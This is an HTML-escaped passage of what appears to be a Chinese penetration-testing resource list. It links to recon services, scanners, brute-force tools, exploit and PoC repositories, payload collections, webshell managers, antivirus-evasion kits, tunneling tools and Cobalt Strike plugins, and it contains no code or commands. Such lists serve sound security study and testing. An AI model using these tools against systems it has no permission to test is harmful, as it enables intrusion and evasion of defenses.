&#xA;&lt;h3&gt;公开知识库&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;零组文库：零组已停运，非官方 &lt;a href=&#34;https://0-wiki.com/&#34;&gt;https://0-wiki.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;先知社区：&lt;a href=&#34;https://xz.aliyun.com/&#34;&gt;https://xz.aliyun.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;狼组公开知识库：&lt;a href=&#34;https://wiki.wgpsec.org/&#34;&gt;https://wiki.wgpsec.org/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;404星链计划：知道创宇 404 实验室 &lt;a href=&#34;https://github.com/knownsec/404StarLink&#34;&gt;https://github.com/knownsec/404StarLink&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;MITRE ATT＆CK：网络攻击中使用的已知对抗战术和技术 &lt;a href=&#34;https://attack.mitre.org/matrices/enterprise/&#34;&gt;https://attack.mitre.org/matrices/enterprise/&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;其他&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Wayback Machine：网页历史缓存 &lt;a href=&#34;https://archive.org/web&#34;&gt;https://archive.org/web&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;信息收集&lt;/h2&gt; &#xA;&lt;h3&gt;IP/域名&lt;/h3&gt; &#xA;&lt;h4&gt;确认真实IP地址&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;IP精准定位：&lt;a href=&#34;https://www.ipuu.net/#/home&#34;&gt;https://www.ipuu.net/#/home&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;IP 138：&lt;a href=&#34;https://site.ip138.com/&#34;&gt;https://site.ip138.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Security Trails：&lt;a href=&#34;https://securitytrails.com/&#34;&gt;https://securitytrails.com/&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;多个地点Ping服务器&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Chinaz：&lt;a href=&#34;https://ping.chinaz.com/&#34;&gt;https://ping.chinaz.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Host Tracker：&lt;a href=&#34;https://www.host-tracker.com/&#34;&gt;https://www.host-tracker.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Webpage Test：&lt;a href=&#34;https://www.webpagetest.org/&#34;&gt;https://www.webpagetest.org/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;DNS Check：&lt;a href=&#34;https://dnscheck.pingdom.com/&#34;&gt;https://dnscheck.pingdom.com/&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Whois注册信息反查&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;站长之家 Whois：&lt;a href=&#34;https://whois.chinaz.com/&#34;&gt;https://whois.chinaz.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;中国万网 Whois：&lt;a href=&#34;https://whois.aliyun.com/&#34;&gt;https://whois.aliyun.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;国际 Whois：&lt;a href=&#34;https://who.is/&#34;&gt;https://who.is/&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;DNS数据聚合查询&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Hacker Target：&lt;a href=&#34;https://hackertarget.com/find-dns-host-records&#34;&gt;https://hackertarget.com/find-dns-host-records&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;DNS Dumpster：&lt;a href=&#34;https://dnsdumpster.com&#34;&gt;https://dnsdumpster.com&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;DNS DB：&lt;a href=&#34;https://dnsdb.io/zh-cn&#34;&gt;https://dnsdb.io/zh-cn&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;TLS证书信息查询&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Censys：&lt;a href=&#34;https://censys.io&#34;&gt;https://censys.io&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Certificate Search：&lt;a href=&#34;https://crt.sh&#34;&gt;https://crt.sh&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;证书透明度监控：&lt;a href=&#34;https://developers.facebook.com/tools/ct&#34;&gt;https://developers.facebook.com/tools/ct&lt;/a&gt;&#34;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;IP地址段收集&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;CNNIC中国互联网信息中心：&lt;a href=&#34;http://ipwhois.cnnic.net.cn&#34;&gt;http://ipwhois.cnnic.net.cn&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;指纹识别&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Wapplyzer：Chrome插件 跨平台网站分析工具 &lt;a href=&#34;https://github.com/AliasIO/Wappalyzer&#34;&gt;https://github.com/AliasIO/Wappalyzer&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;TideFinger：提取了多个开源指纹识别工具的规则库并进行了规则重组 &lt;a href=&#34;https://github.com/TideSec/TideFinger&#34;&gt;https://github.com/TideSec/TideFinger&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;御剑web指纹识别程序：&lt;a href=&#34;https://www.webshell.cc/4697.html&#34;&gt;https://www.webshell.cc/4697.html&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;云悉指纹识别：&lt;a href=&#34;http://www.yunsee.cn/&#34;&gt;http://www.yunsee.cn/&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;扫描/爆破&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;dirsearch：目录扫描/爆破 &lt;a href=&#34;https://github.com/maurosoria/dirsearch&#34;&gt;https://github.com/maurosoria/dirsearch&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;dirmap：目录扫描/爆破 &lt;a href=&#34;https://github.com/H4ckForJob/dirmap&#34;&gt;https://github.com/H4ckForJob/dirmap&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Arjun：HTTP参数扫描器 &lt;a href=&#34;https://github.com/s0md3v/Arjun&#34;&gt;https://github.com/s0md3v/Arjun&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;ksubdomain：子域名爆破 &lt;a href=&#34;https://github.com/knownsec/ksubdomain&#34;&gt;https://github.com/knownsec/ksubdomain&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Gobuster：URI/DNS/WEB爆破 &lt;a href=&#34;https://github.com/OJ/gobuster&#34;&gt;https://github.com/OJ/gobuster&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Hydra：弱密码爆破 &lt;a href=&#34;https://github.com/vanhauser-thc/thc-hydra&#34;&gt;https://github.com/vanhauser-thc/thc-hydra&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;John the Ripper：&lt;a href=&#34;https://github.com/openwall/john&#34;&gt;https://github.com/openwall/john&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;爆破字典&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Dictionary-Of-Pentesting：渗透测试、SRC漏洞挖掘、爆破、Fuzzing等常用字典 &lt;a href=&#34;https://github.com/insightglacier/Dictionary-Of-Pentesting&#34;&gt;https://github.com/insightglacier/Dictionary-Of-Pentesting&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;fuzzDicts：Web渗透Fuzz字典 &lt;a href=&#34;https://github.com/TheKingOfDuck/fuzzDicts&#34;&gt;https://github.com/TheKingOfDuck/fuzzDicts&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;PentesterSpecialDict：渗透测试工程师精简化字典 &lt;a href=&#34;https://github.com/ppbibo/PentesterSpecialDict&#34;&gt;https://github.com/ppbibo/PentesterSpecialDict&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;信息泄露&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;GitHack：.git泄露利用脚本 &lt;a href=&#34;https://github.com/lijiejie/GitHack&#34;&gt;https://github.com/lijiejie/GitHack&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;综合信息收集&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;AlliN：&lt;a href=&#34;https://github.com/P1-Team/AlliN&#34;&gt;https://github.com/P1-Team/AlliN&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Kunyu：&lt;a href=&#34;https://github.com/knownsec/Kunyu&#34;&gt;https://github.com/knownsec/Kunyu&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;OneForAll：&lt;a href=&#34;https://github.com/shmilylty/OneForAll&#34;&gt;https://github.com/shmilylty/OneForAll&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;ShuiZe：&lt;a href=&#34;https://github.com/0x727/ShuiZe_0x727&#34;&gt;https://github.com/0x727/ShuiZe_0x727&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Fofa Viewer：&lt;a href=&#34;https://github.com/wgpsec/fofa_viewer&#34;&gt;https://github.com/wgpsec/fofa_viewer&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;内网信息收集&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;fscan：内网综合扫描工具 &lt;a href=&#34;https://github.com/shadow1ng/fscan&#34;&gt;https://github.com/shadow1ng/fscan&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;hping3：端口扫描 高速 发包量少 结果准确无蜜罐 &lt;a href=&#34;https://github.com/antirez/hping&#34;&gt;https://github.com/antirez/hping&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;EHole：红队重点攻击系统指纹探测工具 &lt;a href=&#34;https://github.com/EdgeSecurityTeam/EHole&#34;&gt;https://github.com/EdgeSecurityTeam/EHole&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Ladon：用于大型网络渗透的多线程插件化综合扫描工具 &lt;a href=&#34;https://github.com/k8gege/Ladon&#34;&gt;https://github.com/k8gege/Ladon&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;漏洞研究&lt;/h2&gt; &#xA;&lt;h3&gt;SRC&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;HackerOne：&lt;a href=&#34;https://www.hackerone.com/&#34;&gt;https://www.hackerone.com/&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;开源文库&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Vulhub：&lt;a href=&#34;https://vulhub.org/&#34;&gt;https://vulhub.org/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;PeiQi：&lt;a href=&#34;http://wiki.peiqi.tech/&#34;&gt;http://wiki.peiqi.tech/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;乌云镜像：&lt;a href=&#34;http://wooyun.2xss.cc/&#34;&gt;http://wooyun.2xss.cc/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;未授权访问漏洞总结：&lt;a href=&#34;http://luckyzmj.cn/posts/15dff4d3.html&#34;&gt;http://luckyzmj.cn/posts/15dff4d3.html&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;靶机平台&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;DVWA：&lt;a href=&#34;https://github.com/digininja/DVWA&#34;&gt;https://github.com/digininja/DVWA&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;HackTheBox：&lt;a href=&#34;https://www.hackthebox.com/&#34;&gt;https://www.hackthebox.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;OWASP Top10：&lt;a href=&#34;https://owasp.org/www-project-juice-shop/&#34;&gt;https://owasp.org/www-project-juice-shop/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;WebGoat：&lt;a href=&#34;https://github.com/WebGoat/WebGoat&#34;&gt;https://github.com/WebGoat/WebGoat&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Sqli-labs：SQL注入 &lt;a href=&#34;https://github.com/Audi-1/sqli-labs&#34;&gt;https://github.com/Audi-1/sqli-labs&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Xss-labs：XSS注入 &lt;a href=&#34;https://github.com/do0dl3/xss-labs&#34;&gt;https://github.com/do0dl3/xss-labs&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Upload-labs：上传漏洞 &lt;a href=&#34;https://github.com/c0ny1/upload-labs&#34;&gt;https://github.com/c0ny1/upload-labs&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Vulstudy：docker快速搭建共17个漏洞靶场 &lt;a href=&#34;https://github.com/c0ny1/vulstudy&#34;&gt;https://github.com/c0ny1/vulstudy&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;漏洞利用&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Exploit Database：&lt;a href=&#34;https://www.exploit-db.com/&#34;&gt;https://www.exploit-db.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Windows-Exploit-Suggester：&lt;a href=&#34;https://github.com/AonCyberLabs/Windows-Exploit-Suggester&#34;&gt;https://github.com/AonCyberLabs/Windows-Exploit-Suggester&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Linux_Exploit_Suggester：&lt;a href=&#34;https://github.com/InteliSecureLabs/Linux_Exploit_Suggester&#34;&gt;https://github.com/InteliSecureLabs/Linux_Exploit_Suggester&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Vulnerability：&lt;a href=&#34;https://github.com/EdgeSecurityTeam/Vulnerability&#34;&gt;https://github.com/EdgeSecurityTeam/Vulnerability&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;POChouse：&lt;a href=&#34;https://github.com/DawnFlame/POChouse&#34;&gt;https://github.com/DawnFlame/POChouse&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Some-PoC-oR-ExP：各种漏洞PoC、ExP的收集或编写 &lt;a href=&#34;https://github.com/coffeehb/Some-PoC-oR-ExP&#34;&gt;https://github.com/coffeehb/Some-PoC-oR-ExP&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Penetration_Testing_POC：&lt;a href=&#34;https://github.com/Mr-xn/Penetration_Testing_POC&#34;&gt;https://github.com/Mr-xn/Penetration_Testing_POC&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;CMS-Hunter：CMS漏洞测试用例集合 &lt;a href=&#34;https://github.com/SecWiki/CMS-Hunter&#34;&gt;https://github.com/SecWiki/CMS-Hunter&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Vulmap：漏洞扫描和验证工具 &lt;a href=&#34;https://github.com/zhzyker/vulmap&#34;&gt;https://github.com/zhzyker/vulmap&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;ysoserial：Java反序列化 &lt;a href=&#34;https://github.com/frohoff/ysoserial&#34;&gt;https://github.com/frohoff/ysoserial&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;DNSlog&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Ceye DNS：在线平台 &lt;a href=&#34;http://ceye.io/&#34;&gt;http://ceye.io/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Dnslog：在线平台 &lt;a href=&#34;http://dnslog.cn/&#34;&gt;http://dnslog.cn/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Fuzz.Red：在线平台 &lt;a href=&#34;https://github.com/AlphabugX/Alphalog&#34;&gt;https://github.com/AlphabugX/Alphalog&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;DNSLog-GO：自建私有平台 &lt;a href=&#34;https://github.com/lanyi1998/DNSlog-GO&#34;&gt;https://github.com/lanyi1998/DNSlog-GO&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Bypass&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;CVE-2021-44228-PoC-log4j-bypass-words：&lt;a href=&#34;https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words&#34;&gt;https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;内网渗透&lt;/h2&gt; &#xA;&lt;h3&gt;Payloads&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;PayloadsAllTheThings：&lt;a href=&#34;https://github.com/swisskyrepo/PayloadsAllTheThings&#34;&gt;https://github.com/swisskyrepo/PayloadsAllTheThings&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;java.lang.Runtime.exec() Payload：java Payload在线生成 &lt;a href=&#34;https://www.bugku.net/runtime-exec-payloads/&#34;&gt;https://www.bugku.net/runtime-exec-payloads/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;PHP Generic Gadget Chains：PHP反序列化Payload &lt;a href=&#34;https://github.com/ambionics/phpggc&#34;&gt;https://github.com/ambionics/phpggc&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;WebShell&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Webshell收集项目：&lt;a href=&#34;https://github.com/tennc/webshell&#34;&gt;https://github.com/tennc/webshell&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Behinder 冰蝎：&lt;a href=&#34;https://github.com/rebeyond/Behinder&#34;&gt;https://github.com/rebeyond/Behinder&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Behinder3：&lt;code&gt;kali + java 11.0.14&lt;/code&gt; 或 &lt;code&gt;windows10 + java 1.8.0_91&lt;/code&gt;，注意，该环境下Behinder2无法正常运行&lt;/li&gt; &#xA;   &lt;li&gt;Behinder2：windows10 + java 1.8.0_91&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Godzilla 哥斯拉：&lt;a href=&#34;https://github.com/BeichenDream/Godzilla&#34;&gt;https://github.com/BeichenDream/Godzilla&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Bypass&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;PHPFuck：&lt;a href=&#34;https://github.com/splitline/PHPFuck&#34;&gt;https://github.com/splitline/PHPFuck&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;JSFuck：&lt;a href=&#34;http://www.jsfuck.com/&#34;&gt;http://www.jsfuck.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Gopherus：生成gopher链接 &lt;a href=&#34;https://github.com/tarunkant/Gopherus&#34;&gt;https://github.com/tarunkant/Gopherus&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;免杀&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;GolangBypassAV：&lt;a href=&#34;https://github.com/safe6Sec/GolangBypassAV&#34;&gt;https://github.com/safe6Sec/GolangBypassAV&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;BypassAntiVirus：远控免杀系列文章及配套工具 &lt;a href=&#34;https://github.com/TideSec/BypassAntiVirus&#34;&gt;https://github.com/TideSec/BypassAntiVirus&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;内网穿透&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;NPS：通过web端管理，无需配置文件 &lt;a href=&#34;https://github.com/ehang-io/nps&#34;&gt;https://github.com/ehang-io/nps&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;FRP：55k star项目 &lt;a href=&#34;https://github.com/fatedier/frp&#34;&gt;https://github.com/fatedier/frp&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Neo-reGeorg：tunnel快速部署 &lt;a href=&#34;https://github.com/L-codes/Neo-reGeorg&#34;&gt;https://github.com/L-codes/Neo-reGeorg&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Proxifier：windows代理工具 &lt;a href=&#34;https://www.proxifier.com/&#34;&gt;https://www.proxifier.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Proxychains：kali代理工具 &lt;a href=&#34;https://github.com/haad/proxychains&#34;&gt;https://github.com/haad/proxychains&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;开源蜜罐&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;HFish：一款安全、简单可信赖的跨平台蜜罐软件，允许商业和个人用户免费使用 &lt;a href=&#34;https://github.com/hacklcx/HFish&#34;&gt;https://github.com/hacklcx/HFish&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;容器安全&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;CDK：容器渗透 &lt;a href=&#34;https://github.com/cdk-team/CDK&#34;&gt;https://github.com/cdk-team/CDK&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;veinmind-tools：容器安全工具集 &lt;a href=&#34;https://github.com/chaitin/veinmind-tools&#34;&gt;https://github.com/chaitin/veinmind-tools&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;其他&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The art of command line：快速掌握命令行 &lt;a href=&#34;https://github.com/jlevy/the-art-of-command-line&#34;&gt;https://github.com/jlevy/the-art-of-command-line&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Responder：实现获取NTLM Hash等功能 &lt;a href=&#34;https://github.com/SpiderLabs/Responder&#34;&gt;https://github.com/SpiderLabs/Responder&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Impacket：其中的psexec.py通过用户名和密码远程连接到目标服务器 &lt;a href=&#34;https://github.com/SecureAuthCorp/impacket&#34;&gt;https://github.com/SecureAuthCorp/impacket&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;PsTools：PsExec.exe功能同Impacket中的psexec.py &lt;a href=&#34;https://docs.microsoft.com/en-us/sysinternals/downloads/pstools&#34;&gt;https://docs.microsoft.com/en-us/sysinternals/downloads/pstools&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;新一代信息技术&lt;/h2&gt; &#xA;&lt;h3&gt;移动端/物联网&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;CrackMinApp：反编译微信小程序 &lt;a href=&#34;https://github.com/Cherrison/CrackMinApp&#34;&gt;https://github.com/Cherrison/CrackMinApp&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;AppInfoScanner：移动端信息收集 &lt;a href=&#34;https://github.com/kelvinBen/AppInfoScanner&#34;&gt;https://github.com/kelvinBen/AppInfoScanner&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;wxappUnpacker：小程序解包 &lt;a href=&#34;https://github.com/xuedingmiaojun/wxappUnpacker&#34;&gt;https://github.com/xuedingmiaojun/wxappUnpacker&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;IoT-vulhub： IoT 版固件漏洞复现环境 &lt;a href=&#34;https://github.com/firmianay/IoT-vulhub&#34;&gt;https://github.com/firmianay/IoT-vulhub&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;云服务&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;aliyun-accesskey-Tools：阿里云accesskey利用工具 &lt;a href=&#34;https://github.com/mrknow001/aliyun-accesskey-Tools&#34;&gt;https://github.com/mrknow001/aliyun-accesskey-Tools&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;cosbrowser：腾讯云COS客户端 &lt;a href=&#34;https://github.com/TencentCloud/cosbrowser&#34;&gt;https://github.com/TencentCloud/cosbrowser&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;大数据&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;DruidCrack：Druid密文解密工具 &lt;a href=&#34;https://github.com/rabbitmask/DruidCrack&#34;&gt;https://github.com/rabbitmask/DruidCrack&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;逆向分析&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;逆向分析工具集：&lt;a href=&#34;https://pythonarsenal.com/&#34;&gt;https://pythonarsenal.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;PEiD：查壳工具 &lt;a href=&#34;https://www.aldeid.com/wiki/PEiD&#34;&gt;https://www.aldeid.com/wiki/PEiD&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Py2exe：Python打包工具 &lt;a href=&#34;https://www.py2exe.org/&#34;&gt;https://www.py2exe.org/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;PyInstaller：Python打包工具 &lt;a href=&#34;https://github.com/pyinstaller/pyinstaller&#34;&gt;https://github.com/pyinstaller/pyinstaller&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;CTF&lt;/h2&gt; &#xA;&lt;h3&gt;CTF平台&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;CTF Wiki：&lt;a href=&#34;https://ctf-wiki.org/&#34;&gt;https://ctf-wiki.org/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;CTF Time：&lt;a href=&#34;https://ctftime.org/&#34;&gt;https://ctftime.org/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;CTF Tools：&lt;a href=&#34;https://github.com/zardus/ctf-tools&#34;&gt;https://github.com/zardus/ctf-tools&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;攻防世界：&lt;a href=&#34;https://adworld.xctf.org.cn/&#34;&gt;https://adworld.xctf.org.cn/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Hacker 101：&lt;a href=&#34;https://www.hacker101.com/&#34;&gt;https://www.hacker101.com/&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;工具赋能&lt;/h2&gt; &#xA;&lt;h3&gt;Metasploit&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Metasploit：&lt;a href=&#34;https://github.com/rapid7/metasploit-framework&#34;&gt;https://github.com/rapid7/metasploit-framework&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Cobaltstrike&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Awesome CobaltStrike：CobaltStrike知识库 &lt;a href=&#34;https://github.com/zer0yu/Awesome-CobaltStrike&#34;&gt;https://github.com/zer0yu/Awesome-CobaltStrike&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Erebus：后渗透测试插件 &lt;a href=&#34;https://github.com/DeEpinGh0st/Erebus&#34;&gt;https://github.com/DeEpinGh0st/Erebus&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;LSTAR：综合后渗透插件 &lt;a href=&#34;https://github.com/lintstar/LSTAR&#34;&gt;https://github.com/lintstar/LSTAR&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;ElevateKit：提权插件 &lt;a href=&#34;https://github.com/rsmudge/ElevateKit&#34;&gt;https://github.com/rsmudge/ElevateKit&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Burpsuite&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;HaE：高亮标记与信息提取辅助型插件 &lt;a href=&#34;https://github.com/gh0stkey/HaE&#34;&gt;https://github.com/gh0stkey/HaE&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Log4j2Scan：Log4j主动扫描 &lt;a href=&#34;https://github.com/whwlsfb/Log4j2Scan&#34;&gt;https://github.com/whwlsfb/Log4j2Scan&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Chrome crx&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; 